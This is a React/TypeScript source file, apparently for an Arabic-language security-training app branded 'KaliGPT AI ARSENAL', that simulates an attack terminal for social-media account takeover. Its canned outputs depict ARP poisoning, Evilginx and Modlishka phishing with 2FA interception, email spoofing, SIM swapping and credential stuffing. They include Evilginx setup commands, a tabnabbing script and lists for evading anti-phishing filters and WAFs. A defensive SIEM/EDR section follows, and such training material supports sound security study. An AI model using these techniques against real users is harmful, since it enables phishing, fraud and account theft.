    { text: "[+] تطبيق قواعد الإضافة: ahmed@, ahmed123, ahmed!", color: "#10b981" },
    { text: "[+] كلمات اجتماعية: ahmedksa, ahmed_sa, ahmed2024", color: "#10b981" },
    { text: "[+] Hybrid: ahmed+1995 variations", color: "#10b981" },
    { text: "[✓] توليد 1,293,847 كلمة مرور → ahmed_wordlist.txt (18MB)", color: "#10b981" },
  ],
  ettercap: [
    { text: "[*] Ettercap v0.8.3 — MitM Attack Suite", color: "#f59e0b" },
    { text: "[*] الواجهة: wlan0 — الوضع: ARP Poisoning", color: "#6b7280" },
    { text: "[+] Scanning for hosts...", color: "#f59e0b" },
    { text: "[+] 12 hosts found in 192.168.1.0/24", color: "#10b981" },
    { text: "[*] ARP Poisoning بين الضحية والبوابة...", color: "#f59e0b" },
    { text: "[!] MITM attack — كل الحركة تمر عبرنا!", color: "#f97316" },
    { text: "[+] HTTP credentials:", color: "#10b981" },
    { text: "  URL: http://forum.target.com/login", color: "#6b7280" },
    { text: "  USER: victim@mail.com PASS: Forum@2024", color: "#e21227" },
    { text: "[✓] SSL Strip ناجح — اعتراض HTTPS محتمل", color: "#f59e0b" },
  ],
  "recon-ng": [
    { text: "[*] Recon-ng v5.1.2 — Web Reconnaissance Framework", color: "#8b5cf6" },
    { text: "recon-ng> workspace create target_company", color: "#6b7280" },
    { text: "recon-ng> marketplace install all", color: "#6b7280" },
    { text: "[+] 162 وحدة مثبتة بنجاح", color: "#10b981" },
    { text: "recon-ng> use recon/domains-contacts/whois_pocs", color: "#8b5cf6" },
    { text: "[+] john.doe@target-company.com", color: "#10b981" },
    { text: "[+] ahmed.ali@target-company.com", color: "#10b981" },
    { text: "recon-ng> use recon/domains-hosts/shodan_hostname", color: "#8b5cf6" },
    { text: "[+] mail.target-company.com (203.x.x.x)", color: "#10b981" },
    { text: "[+] vpn.target-company.com (203.x.x.y)", color: "#10b981" },
    { text: "recon-ng> report html --filename report.html", color: "#6b7280" },
    { text: "[✓] تقرير كامل HTML جاهز", color: "#8b5cf6" },
  ],
  theharvester: [
    { text: "[*] theHarvester v4.6.0 — Email & Domain OSINT", color: "#22d3ee" },
    { text: "[*] هدف: target-company.com", color: "#6b7280" },
    { text: "[*] المصادر: google, bing, linkedin, hunter", color: "#6b7280" },
    { text: "[+] عناوين بريد إلكتروني مكتشفة:", color: "#22d3ee" },
    { text: "  john.doe@target-company.com", color: "#10b981" },
    { text: "  ceo@target-company.com", color: "#10b981" },
    { text: "  support@target-company.com", color: "#10b981" },
    { text: "[+] Subdomains:", color: "#22d3ee" },
    { text: "  mail.target-company.com (203.x.x.1)", color: "#10b981" },
    { text: "  api.target-company.com (203.x.x.2)", color: "#10b981" },
    { text: "[✓] تصدير XML كامل — 11 email, 8 subdomains", color: "#22d3ee" },
  ],
  tabnabbing: [
    { text: "[*] Tabnabbing Attack — Browser Tab Manipulation", color: "#00e5ff" },
    { text: "[*] إنشاء صفحة ويب خبيثة...", color: "#6b7280" },
    { text: "[+] JavaScript معد للمراقبة:", color: "#00e5ff" },
    { text: "  document.addEventListener('visibilitychange', () => {", color: "#6b7280" },
    { text: "    if(document.hidden) { replacePage(); }", color: "#6b7280" },
    { text: "  });", color: "#6b7280" },
    { text: "[+] صفحة Instagram Login مُحمَّلة جاهزة", color: "#10b981" },
    { text: "[+] Favicon تغيّر إلى شعار Instagram", color: "#10b981" },
    { text: "[+] Title تغيّر إلى: 'Instagram'", color: "#10b981" },
    { text: "[!] في انتظار عدم نشاط المستخدم 5 ثوانٍ...", color: "#f59e0b" },
    { text: "[✓] عند عودة المستخدم — سيرى صفحة تسجيل دخول مزيفة!", color: "#00e5ff" },
  ],
  googletrans: [
    { text: "[*] Google Translate Phishing Bypass", color: "#f97316" },
    { text: "[*] إنشاء رابط تصيد مخفي عبر Google Translate...", color: "#6b7280" },
    { text: "[+] رابط التصيد الأصلي:", color: "#6b7280" },
    { text: "  http://ig-phish.malicious.com/login", color: "#e21227" },
    { text: "[+] تحويله عبر Google Translate:", color: "#f97316" },
    { text: "  https://translate.google.com/translate?", color: "#f97316" },
    { text: "  sl=en&tl=ar&u=http://ig-phish.malicious.com/login", color: "#f97316" },
    { text: "[!] النطاق النهائي: translate.google.com ✓ (موثوق!)", color: "#10b981" },
    { text: "[+] Anti-phishing filters: BYPASSED ✓", color: "#10b981" },
    { text: "[✓] ارسل هذا الرابط — يبدو شرعياً 100%!", color: "#f97316" },
  ],
  emailspoof: [
    { text: "[*] Email Spoofing Attack — Swaks Tool", color: "#10b981" },
    { text: "[*] التحقق من SPF/DKIM للنطاق المستهدف...", color: "#6b7280" },
    { text: "[!] SPF: ضعيف — يسمح بـ ?all (قابل للانتحال!)", color: "#f97316" },
    { text: "[!] DKIM: مفقود — لا توقيع رقمي!", color: "#e21227" },
    { text: "[+] إرسال بريد انتحالي:", color: "#10b981" },
    { text: "  From: security@instagram.com", color: "#10b981" },
    { text: "  To: victim@email.com", color: "#6b7280" },
    { text: "  Subject: ⚠️ تنبيه: محاولة دخول غير مصرح بها", color: "#f59e0b" },
    { text: "  Body: [رابط تصيد لصفحة Instagram]", color: "#e21227" },
    { text: "[✓] البريد أُرسل — يظهر من security@instagram.com!", color: "#10b981" },
  ],
  "2fabypass": [
    { text: "[*] 2FA/MFA Bypass via Real-time Phishing", color: "#ec4899" },
    { text: "[*] استخدام: Evilginx2 كـ Reverse Proxy", color: "#6b7280" },
    { text: "[+] الضحية تدخل بريدها وكلمة مرورها...", color: "#6b7280" },
    { text: "[+] Evilginx يمرر البيانات للـ Instagram الحقيقي", color: "#ec4899" },
    { text: "[!] Instagram يطلب 2FA code...", color: "#f59e0b" },
    { text: "[+] الضحية تدخل الكود — Evilginx يعترضه فوراً!", color: "#ec4899" },
    { text: "[!] SESSION TOKEN مُستخرج:", color: "#e21227" },
    { text: "  sessionid=AQD7k8xyz_abc...", color: "#e21227" },
    { text: "[✓] أرسل هذا الـ Cookie للمتصفح — دخلت الحساب!", color: "#ec4899" },
  ],
  simswap: [
    { text: "[*] SIM Swapping Attack — Social Engineering Carrier", color: "#f97316" },
    { text: "[*] التحضير لهجوم SIM Swap على +966-5xx-xxxx87", color: "#6b7280" },
    { text: "[+] جمع معلومات الضحية من OSINT:", color: "#6b7280" },
    { text: "  الاسم الكامل: أحمد محمد علي", color: "#10b981" },
    { text: "  تاريخ الميلاد: 15/03/1990", color: "#10b981" },
    { text: "  آخر 4 أرقام من بطاقة الهوية: 1234", color: "#10b981" },
    { text: "[*] الاتصال بخدمة عملاء شركة الاتصال...", color: "#f97316" },
    { text: "[*] انتحال الشخصية: 'رقمي تلف وأريد نقله لشريحة جديدة'", color: "#f59e0b" },
    { text: "[!] نقل ناجح — SMS يصل لشريحة المهاجم!", color: "#e21227" },
    { text: "[✓] كل رموز SMS OTP تصل للمهاجم الآن!", color: "#f97316" },
  ],
  credstuff: [
    { text: "[*] Credential Stuffing Attack — OpenBullet2", color: "#8b5cf6" },
    { text: "[*] تحميل قائمة بيانات مسربة...", color: "#6b7280" },
    { text: "[+] Combo List: 50,000,000 email:password (Collection #1)", color: "#10b981" },
    { text: "[+] Filtering: instagram specific password patterns", color: "#10b981" },
    { text: "[*] Proxy Pool: 500 proxy rotated — جاهز", color: "#6b7280" },
    { text: "[*] بدء الحشو: 100 thread متوازي...", color: "#8b5cf6" },
    { text: "[+] HIT: user1@email.com : Summer2023! ✓", color: "#10b981" },
    { text: "[+] HIT: user2@gmail.com : Welcome@1 ✓", color: "#10b981" },
    { text: "[*] 0.1% معدل نجاح × 50M = ~50,000 حساب محتمل!", color: "#f59e0b" },
    { text: "[✓] نتائج محفوظة: hits.txt — 847 حساب صحيح", color: "#8b5cf6" },
  ],
  evilginx: [
    { text: "[*] Evilginx v3.2.0 — Advanced MitM Phishing Framework", color: "#ec4899" },
    { text: "[+] DNS Server — نشط على :53", color: "#10b981" },
    { text: "[+] HTTPS Server — نشط على :443 (Let's Encrypt ✓)", color: "#10b981" },
    { text: "[+] Phishlet محمّل: instagram (v2024)", color: "#ec4899" },
    { text: "phishlets hostname instagram ig.fake-domain.com", color: "#6b7280" },
    { text: "phishlets enable instagram", color: "#6b7280" },
    { text: "lures create instagram", color: "#6b7280" },
    { text: "[+] Lure URL: https://ig.fake-domain.com/verify/xK8j2", color: "#e21227" },
    { text: "[!] 2FA Bypass: ENABLED — يعترض OTP تلقائياً", color: "#f59e0b" },
    { text: "[*] انتظار الجلسات — tokens ستظهر هنا...", color: "#6b7280" },
    { text: "[✓] Evilginx جاهز — أرسل الـ Lure URL للضحية", color: "#ec4899" },
  ],
  modlishka: [
    { text: "[*] Modlishka v1.1.0 — Phishing Reverse Proxy", color: "#f97316" },
    { text: "[+] إعداد Reverse Proxy لـ instagram.com...", color: "#6b7280" },
    { text: "[+] SSL Certificate: Let's Encrypt — نشط", color: "#10b981" },
    { text: "[+] Tracking JavaScript — مُحقَّن", color: "#10b981" },
    { text: "[+] Credential Logging — نشط", color: "#10b981" },
    { text: "[+] 2FA Interception — نشط (Real-time mode)", color: "#ec4899" },
    { text: "[!] Phishing URL: https://verify.ig-check.me", color: "#e21227" },
    { text: "[*] انتظار الضحايا...", color: "#6b7280" },
    { text: "[✓] كل بيانات الدخول ستُحفظ في credentials.db", color: "#f97316" },
  ],
  osintgram: [
    { text: "[*] Osintgram v2.1 — Instagram OSINT Tool", color: "#ec4899" },
    { text: "[+] تسجيل الدخول... ✓", color: "#10b981" },
    { text: "[*] الهدف: @target_username", color: "#6b7280" },
    { text: "[+] المتابعون: 15,847 / المتابَعون: 923", color: "#ec4899" },
    { text: "[+] مواقع GPS من 47 صورة:", color: "#f97316" },
    { text: "  1. الرياض (N 24.68, E 46.72) — 23 مرة", color: "#f97316" },
    { text: "  2. جدة (N 21.54, E 39.21) — 8 مرات", color: "#f59e0b" },
    { text: "[+] بريد إلكتروني: ahmed@company.sa", color: "#10b981" },
    { text: "[+] رقم هاتف: +966-5xx-xxx87 (من Biography)", color: "#10b981" },
    { text: "[+] حسابات مرتبطة: Facebook Page, Twitter", color: "#ec4899" },
    { text: "[✓] 63 نقطة بيانات — تقرير JSON جاهز", color: "#ec4899" },
  ],
  gophish: [
    { text: "[*] GoPhish v0.12.1 — Open Source Phishing Framework", color: "#10b981" },
    { text: "[+] Web Interface: https://localhost:3333", color: "#10b981" },
    { text: "[+] API Token: جاهز للاستخدام", color: "#10b981" },
    { text: "[*] إنشاء حملة تصيد جديدة:", color: "#6b7280" },
    { text: "[+] Template: Instagram Security Alert (HTML)", color: "#10b981" },
    { text: "[+] Sending Profile: AWS SES (smtp.gmail.com)", color: "#10b981" },
    { text: "[+] قائمة المستهدفين: 500 بريد إلكتروني", color: "#f59e0b" },
    { text: "[!] الحملة بدأت — Pixel Tracking: نشط", color: "#f97316" },
    { text: "[+] فتح البريد: 247/500 (49.4%)", color: "#10b981" },
    { text: "[+] نقر الرابط: 89/247 (36%)", color: "#f59e0b" },
    { text: "[+] بيانات مُدخَلة: 34/89 (38.2%)", color: "#e21227" },
    { text: "[✓] تقرير PDF جاهز — 34 ضحية اصطيدت", color: "#10b981" },
  ],
  clear: [] as Array<{ text: string; color: string }>,
};

function HackTerminal() {
  const [input, setInput] = useState("");
  const [lines, setLines] = useState<Array<{ text: string; color: string }>>([
    { text: "╔══════════════════════════════════════════════════════════════╗", color: "#e21227" },
    { text: "║  SOCIAL MEDIA ATTACK TERMINAL v5.0.0 — KaliGPT AI ARSENAL  ║", color: "#e21227" },
    { text: "║         منصة اختبار اختراق وسائل التواصل الاجتماعي          ║", color: "#a855f7" },
    { text: "╚══════════════════════════════════════════════════════════════╝", color: "#e21227" },
    { text: "", color: "#6b7280" },
    { text: "[*] 32 أداة جاهزة — اكتب 'help' لعرض قائمة الأوامر الكاملة", color: "#10b981" },
    { text: "[*] بيئة محاكاة آمنة — لأغراض تعليمية واختبار الاختراق فقط", color: "#6b7280" },
  ]);
  const [history, setHistory] = useState<string[]>([]);
  const [histIdx, setHistIdx] = useState(-1);
  const endRef = useRef<HTMLDivElement>(null);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: "smooth" }); }, [lines]);

  const handleCmd = useCallback((cmd: string) => {
    const trimmed = cmd.trim().toLowerCase();
    if (!trimmed) return;
    const prompt = { text: `root@kali:~# ${cmd}`, color: "#e21227" };
    if (trimmed === "clear") { setLines([]); return; }
    const resp = TERMINAL_CMDS[trimmed] ?? [
      { text: `bash: ${cmd}: command not found`, color: "#ef4444" },
      { text: "[*] اكتب 'help' لعرض قائمة الأوامر", color: "#6b7280" },
    ];
    setLines(p => [...p, prompt, ...resp]);
    setHistory(h => [cmd, ...h.slice(0, 49)]);
    setHistIdx(-1);
  }, []);

  return (
    <div className="rounded-[18px] overflow-hidden border" style={{ width: "clamp(340px, 40vw, 560px)", backdropFilter: "blur(40px)", borderColor: "#e2122730", background: "#020208" }}>
      <div className="flex items-center gap-2 px-4 py-2.5" style={{ background: "rgba(226,18,39,0.08)", borderBottom: "1px solid rgba(226,18,39,0.18)" }}>
        <div className="flex gap-1.5">
          <div className="w-3 h-3 rounded-full" style={{ background: "#ef4444" }} />
          <div className="w-3 h-3 rounded-full" style={{ background: "#f59e0b" }} />
          <div className="w-3 h-3 rounded-full" style={{ background: "#10b981" }} />
        </div>
        <Terminal size={11} className="text-red-400 ml-2" />
        <span className="text-[10px] font-mono text-red-400">SOCIAL MEDIA ATTACK TERMINAL — root@kali</span>
        <div className="ml-auto flex items-center gap-2">
          <span className="text-[8px] font-mono text-gray-600">{Object.keys(TERMINAL_CMDS).length - 1} أوامر</span>
          <button onClick={() => setLines([])} className="text-gray-600 hover:text-gray-400 transition-colors"><X size={11} /></button>
        </div>
      </div>
      <div className="h-[450px] overflow-y-auto p-4 font-mono text-[11px] leading-[1.6] space-y-0.5"
        style={{ fontFamily: "'Courier New', Courier, monospace" }}>
        {lines.map((l, i) => <div key={i} style={{ color: l.color }}>{l.text || "\u00a0"}</div>)}
        <div ref={endRef} />
      </div>
      <div className="flex items-center gap-2 px-4 py-2.5 border-t" style={{ borderColor: "rgba(226,18,39,0.18)" }}>
        <span className="text-[11px] font-mono text-red-500">root@kali:~#</span>
        <input value={input} onChange={e => setInput(e.target.value)}
          onKeyDown={e => {
            if (e.key === "Enter" && input.trim()) { handleCmd(input); setInput(""); }
            if (e.key === "ArrowUp") { const idx = Math.min(histIdx + 1, history.length - 1); setHistIdx(idx); setInput(history[idx] ?? ""); }
            if (e.key === "ArrowDown") { const idx = Math.max(histIdx - 1, -1); setHistIdx(idx); setInput(history[idx] ?? ""); }
          }}
          placeholder="اكتب أمراً (مثل: help)"
          className="flex-1 bg-transparent text-[11px] font-mono text-gray-200 outline-none placeholder:text-gray-700"
          style={{ fontFamily: "'Courier New', Courier, monospace" }} autoComplete="off" spellCheck={false} />
        <button onClick={() => { if (input.trim()) { handleCmd(input); setInput(""); } }}
          className="text-[9px] font-mono px-2 py-1 rounded font-bold"
          style={{ background: "rgba(226,18,39,0.18)", color: "#e21227", border: "1px solid rgba(226,18,39,0.3)" }}>↵</button>
      </div>
    </div>
  );
}

// ─── OVERVIEW SECTION ─────────────────────────────────────────────────────────
function OverviewSection() {
  return (
    <div className="space-y-4">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="rounded-[18px] border p-4 flex flex-col items-center gap-3"
          style={{ borderColor: "#e2122730", background: "rgba(0,0,0,0.75)", boxShadow: "0 0 30px rgba(226,18,39,0.06)" }}>
          <div className="text-[9px] font-mono tracking-[0.2em] text-red-400">ATTACK RADAR — LIVE</div>
          <AttackRadar size={200} />
          <div className="text-[9px] text-gray-600 font-mono text-center">مراقبة التهديدات في الوقت الفعلي</div>
        </div>
        <div className="md:col-span-2 space-y-3">
          <div className="rounded-2xl border p-4" style={{ borderColor: "#a855f730", background: "rgba(0,0,0,0.75)" }}>
            <div className="text-[9px] font-mono tracking-[0.2em] text-purple-400 mb-3">LIVE INTELLIGENCE FEED</div>
            <LiveTicker />
          </div>
          <div className="rounded-2xl border p-4" style={{ borderColor: "#00e5ff30", background: "rgba(0,0,0,0.75)" }}>
            <div className="text-[9px] font-mono tracking-[0.2em] text-cyan-400 mb-3">ARSENAL COVERAGE</div>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
              {[
                { label: "أطر الهندسة", count: FRAMEWORKS.length, color: "#a855f7", icon: Users },
                { label: "أدوات OSINT", count: OSINT_TOOLS.length, color: "#00e5ff", icon: Search },
                { label: "آليات الهجوم", count: ATTACK_VECTORS.length, color: "#f59e0b", icon: Target },
                { label: "أدوات داعمة", count: SUPPORT_TOOLS.length, color: "#10b981", icon: Cpu },
              ].map(({ label, count, color, icon: Icon }) => (
                <div key={label} className="rounded-xl p-3 flex flex-col items-center gap-1.5"
                  style={{ background: color + "0a", border: `1px solid ${color}25` }}>
                  <Icon size={18} style={{ color }} />
                  <div className="text-2xl font-bold font-mono" style={{ color, textShadow: `0 0 10px ${color}60` }}>{count}</div>
                  <div className="text-[8px] text-gray-500 font-mono text-center">{label}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Attack chain */}
      <div className="rounded-2xl border p-4" style={{ borderColor: "#f59e0b30", background: "rgba(0,0,0,0.75)" }}>
        <div className="text-[9px] font-mono tracking-[0.2em] text-amber-400 mb-3">FULL ATTACK CHAIN — SOCIAL MEDIA TAKEOVER</div>
        <div className="flex items-center gap-1.5 overflow-x-auto pb-2 flex-wrap">
          {[
            { label: "OSINT Recon", color: "#00e5ff" }, { label: "→", color: "#4b5563" },
            { label: "Username Enum", color: "#a855f7" }, { label: "→", color: "#4b5563" },
            { label: "Metadata Scrape", color: "#6366f1" }, { label: "→", color: "#4b5563" },
            { label: "Wordlist Build", color: "#10b981" }, { label: "→", color: "#4b5563" },
            { label: "Phishing Page", color: "#f97316" }, { label: "→", color: "#4b5563" },
            { label: "Social Eng", color: "#a855f7" }, { label: "→", color: "#4b5563" },
            { label: "Cred Harvest", color: "#e21227" }, { label: "→", color: "#4b5563" },
            { label: "2FA Bypass", color: "#ec4899" }, { label: "→", color: "#4b5563" },
            { label: "Session Hijack", color: "#f59e0b" }, { label: "→", color: "#4b5563" },
            { label: "Account Owned", color: "#10b981" },
          ].map((s, i) => (
            <div key={i} className={s.label === "→" ? "text-gray-600 font-mono" :
              "flex-shrink-0 px-2 py-1 rounded-lg text-[9px] font-mono font-bold"}
              style={s.label !== "→" ? { background: s.color + "18", color: s.color, border: `1px solid ${s.color}30` } : { color: s.color }}>
              {s.label}
            </div>
          ))}
        </div>
      </div>

      {/* Summary cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        {[
          { title: "للأغراض التعليمية", desc: "هذا المحتوى لأغراض الأمن الدفاعي وفهم التهديدات وبناء دفاعات أقوى", color: "#10b981", icon: BookOpen },
          { title: "بيئة اختبار محكومة", desc: "استخدام الأدوات في سياق اختبار الاختراق المرخص فقط — مع إذن كتابي مسبق", color: "#00e5ff", icon: Shield },
          { title: "الاستجابة للحوادث", desc: "معرفة كيف تعمل الهجمات هي أساس بناء دفاعات SOC وإجراءات IR فعّالة", color: "#a855f7", icon: Siren },
        ].map(({ title, desc, color, icon: Icon }) => (
          <div key={title} className="rounded-xl p-3 flex gap-3"
            style={{ background: color + "08", border: `1px solid ${color}25` }}>
            <Icon size={16} style={{ color }} className="mt-0.5 flex-shrink-0" />
            <div>
              <div className="text-[10px] font-bold font-mono text-white mb-0.5">{title}</div>
              <div className="text-[9px] text-gray-400 font-mono leading-relaxed">{desc}</div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ─── MAIN PAGE ────────────────────────────────────────────────────────────────
interface Props { onClose?: () => void }

export function SocialMediaArsenalPage({ onClose }: Props) {
  const [section, setSection] = useState("overview");
  const [booted, setBooted] = useState(false);
  const [glitch, setGlitch] = useState(false);

  useEffect(() => {
    const t = setTimeout(() => setBooted(true), 400);
    const gi = setInterval(() => { setGlitch(true); setTimeout(() => setGlitch(false), 90); }, 8000);
    return () => { clearTimeout(t); clearInterval(gi); };
  }, []);

  const cur = SECTIONS.find(s => s.id === section) ?? SECTIONS[0];

  const renderSection = () => {
    switch (section) {
      case "overview": return <OverviewSection />;
      case "frameworks": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            {FRAMEWORKS.length} أطر عمل شاملة لهجمات الهندسة الاجتماعية على وسائل التواصل الاجتماعي
          </div>
          {FRAMEWORKS.map(fw => <FrameworkCard key={fw.id} fw={fw} />)}
        </div>
      );
      case "osint": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            {OSINT_TOOLS.length} أدوات استخبارات مفتوحة — من استطلاع الأشخاص إلى تحليل البيانات الوصفية
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {OSINT_TOOLS.map(t => <OsintCard key={t.id} tool={t} />)}
          </div>
        </div>
      );
      case "attacks": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            {ATTACK_VECTORS.length} آلية هجوم — الأسلوب، الأدوات، التفاصيل التقنية، والدفاع
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {ATTACK_VECTORS.map(av => <AttackVectorCard key={av.id} av={av} />)}
          </div>
        </div>
      );
      case "credential": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            تقنيات حصاد بيانات الاعتماد المتقدمة — الأساليب التفصيلية والـ Bypass Techniques
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {CREDENTIAL_TECHNIQUES.map(t => <CredentialCard key={t.id} tech={t} />)}
          </div>
        </div>
      );
      case "bypass": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            تقنيات التحايل على أنظمة الحماية وتجاوز فلاتر الأمان
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              { id: "unicode", name: "Unicode Lookalike Domains", color: "#a855f7", icon: Globe, desc: "استخدام حروف Unicode تشبه الحروف اللاتينية لإنشاء نطاقات مضللة — instagram.com بـ 'ı' Cyrillic",
                details: ["рaypal.com (Cyrillic р بدل p)", "аpple.com (а Cyrillic بدل a)", "іnstagram.com (Cyrillic і بدل i)", "Punycode: xn--nstagram-t8a.com", "Homograph Attack Tool: Homoglyph Generator", "Browser defense: IDN Punycode Display"] },
              { id: "cloudflare", name: "Cloudflare Protection Bypass", color: "#f97316", icon: Server, desc: "تقنيات تجاوز حماية Cloudflare Anti-bot وWAF أثناء التصيد",
                details: ["IPFS Gateway: ipfs.cf-ipfs.com (موثوق من Cloudflare)", "Cloudflare Workers: لنشر صفحات التصيد", "Page Rules Abuse: تجاوز WAF rules", "TOR + Cloudflare Hidden Service", "Rate Limit Bypass: IP Rotation + Delays", "Challenge Bypass: Puppeteer + FlareSolverr"] },
              { id: "antiphishing", name: "Anti-Phishing Filter Bypass", color: "#00e5ff", icon: Shield, desc: "تجاوز أنظمة كشف التصيد في المتصفحات وخوادم البريد الإلكتروني",
                details: ["Delayed Redirect: الصفحة تبدو عادية أول 2 ثانية", "User-Agent Detection: محتوى مختلف للـ bots والبشر", "CAPTCHA Gating: حل CAPTCHA قبل التصيد لتجنب المسح", "Time-based: يعمل فقط في ساعات معينة", "Geo-filtering: يعمل فقط من IP بلد محدد", "Short-lived domains: نطاقات جديدة كل 24 ساعة"] },
              { id: "emailbypass", name: "Email Security Bypass (SPF/DKIM/DMARC)", color: "#10b981", icon: Mail, desc: "تجاوز فلاتر البريد الإلكتروني عبر استغلال ثغرات إعداد SPF وDKIM",
                details: ["SPF Soft Fail (~all): مسموح بالانتحال بدون رفض", "No DKIM: لا توقيع رقمي — قابل للتزوير", "DMARC: None Policy — لا إجراء عند الفشل", "Sub-domain Attack: phish@mail.target.com", "Display Name Spoofing: الاسم مزيف والعنوان مختلف", "Cousin Domain: targ3t.com, taarget.com"] },
              { id: "urlmasking", name: "URL Masking & Obfuscation", color: "#ec4899", icon: Link, desc: "إخفاء روابط التصيد وجعلها تبدو شرعية للضحية",
                details: ["URL Shorteners: bit.ly, tinyurl, rebrandly", "Google AMP: amp.google.com/url?url=PHISH", "LinkedIn Preview: linkedin.com/safety/go?url=PHISH", "Open Redirects: target.com/redirect?url=PHISH", "Data URI: data:text/html,<script>", "Hex/Octal Encoding: http://0x7f000001/"] },
              { id: "2fabypasstech", name: "Advanced 2FA/MFA Bypass Methods", color: "#f59e0b", icon: Smartphone, desc: "جميع تقنيات تجاوز المصادقة الثنائية المتقدمة",
                details: ["MFA Fatigue/Push Bombing: 50+ طلب موافقة", "SS7 Protocol Exploit: اختراق شبكة الاتصال العالمية", "Authenticator App Cloning: قراءة QR بعدسة تحسسية", "Backup Code Social Engineering: 'أرسل كود الطوارئ'", "Passkey Phishing: حتى FIDO2 قابل للتصيد MitM", "Browser-in-Browser Attack: نافذة تسجيل دخول مزيفة داخل المتصفح"] },
            ].map(item => (
              <div key={item.id} className="rounded-2xl border p-4 space-y-3" style={{ borderColor: item.color + "30", background: "rgba(0,0,0,0.78)" }}>
                <div className="flex items-center gap-2">
                  <div className="w-9 h-9 rounded-xl flex items-center justify-center" style={{ background: item.color + "20", border: `1px solid ${item.color}35` }}>
                    <item.icon size={15} style={{ color: item.color }} />
                  </div>
                  <div>
                    <div className="font-bold text-white text-[11px] font-mono">{item.name}</div>
                  </div>
                </div>
                <p className="text-[10px] text-gray-400 font-mono leading-relaxed">{item.desc}</p>
                <div className="space-y-1">
                  {item.details.map((d, i) => (
                    <div key={i} className="flex items-start gap-1.5 text-[9px] font-mono text-gray-300">
                      <span style={{ color: item.color }} className="mt-0.5 flex-shrink-0">▸</span>
                      {d}
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>
      );
      case "tools": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            {SUPPORT_TOOLS.length} أدوات داعمة في منظومة اختبار اختراق وسائل التواصل الاجتماعي
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {SUPPORT_TOOLS.map(t => <SupportToolCard key={t.id} tool={t} />)}
          </div>
        </div>
      );
      case "siem": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            أنظمة التحليل والمراقبة الأمنية — SIEM / SOAR / EDR لاكتشاف التهديدات والاستجابة التلقائية
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              {
                id: "siem_gen", name: "SIEM — Security Information & Event Management", color: "#f97316",
                desc: "تجميع وتحليل سجلات الأحداث الأمنية من مصادر متعددة للكشف عن التهديدات في الوقت الفعلي",
                platforms: ["Splunk Enterprise Security", "Elastic Security (ELK Stack)", "IBM QRadar", "Microsoft Sentinel", "ArcSight ESM", "LogRhythm SIEM"],
                capabilities: [
                  "Log Aggregation: تجميع سجلات من Firewalls, IDS, Servers, Apps في مكان واحد",
                  "Correlation Rules: ربط أحداث متعددة لاكتشاف هجمات متقدمة لا تُرى منفردة",
                  "Real-time Alerting: تنبيهات فورية عند اكتشاف نشاط مشبوه",
                  "User Behavior Analytics (UEBA): كشف السلوك غير الطبيعي للمستخدمين",
                  "Threat Intelligence Integration: ربط مع TI feeds لمقارنة IOCs",
                  "Compliance Reporting: تقارير SOX, PCI-DSS, HIPAA, GDPR تلقائية",
                ],
              },
              {
                id: "soar", name: "SOAR — Security Orchestration, Automation & Response", color: "#a855f7",
                desc: "أتمتة الاستجابة للحوادث الأمنية وتنسيق الأدوات المختلفة لتقليل وقت الاستجابة من ساعات لدقائق",
                platforms: ["Splunk SOAR (Phantom)", "Palo Alto XSOAR", "IBM Resilient", "Swimlane", "Tines", "Microsoft Sentinel Playbooks"],
                capabilities: [
                  "Playbooks: سيناريوهات استجابة تلقائية للحوادث الشائعة (Phishing, Malware, Brute Force)",
                  "Case Management: إدارة الحوادث والتحقيقات من بدايتها حتى الإغلاق",
                  "Tool Integration: ربط SIEM + EDR + Firewall + Ticketing تلقائياً",
                  "Threat Enrichment: إثراء IOCs تلقائياً من VirusTotal, Shodan, AbuseIPDB",
                  "Automated Blocking: حجب IPs وحسابات تلقائياً عند تجاوز عتبات محددة",
                  "Metrics & KPIs: MTTD (Mean Time to Detect) وMTTR (Mean Time to Respond)",
                ],
              },
              {
                id: "edr", name: "EDR — Endpoint Detection & Response", color: "#10b981",
                desc: "حماية نقاط النهاية (أجهزة الموظفين) مع رصد مستمر وقدرة استجابة فورية",
                platforms: ["CrowdStrike Falcon", "SentinelOne", "Microsoft Defender for Endpoint", "Carbon Black", "Cybereason", "Trend Micro XDR"],
                capabilities: [
                  "Behavioral Detection: كشف التهديدات من السلوك لا التوقيعات — يوقف Zero-Days",
                  "Process Tree Analysis: شجرة كاملة لكل عملية وأطفالها وملفاتها",
                  "Fileless Detection: كشف Fileless Malware التي لا تُخزّن على القرص",
                  "Threat Hunting: أدوات بحث تفاعلية للمحققين على مستوى Enterprise",
                  "Automated Response: عزل الجهاز المصاب فورياً دون تدخل بشري",
                  "Threat Intelligence: ربط فوري بـ threat intel feeds لتصنيف التهديدات",
                ],
              },
              {
                id: "ndr", name: "NDR + XDR — Network & Extended Detection", color: "#00e5ff",
                desc: "كشف التهديدات على مستوى حركة الشبكة وربطها مع EDR للحصول على صورة شاملة",
                platforms: ["Darktrace (AI)", "ExtraHop", "Vectra AI", "Microsoft XDR", "Palo Alto Cortex XDR", "Cisco SecureX"],
                capabilities: [
                  "Network Traffic Analysis (NTA): تحليل كل حزمة شبكية بحثاً عن شذوذ",
                  "East-West Traffic: رصد حركة الشبكة الداخلية لاكتشاف Lateral Movement",
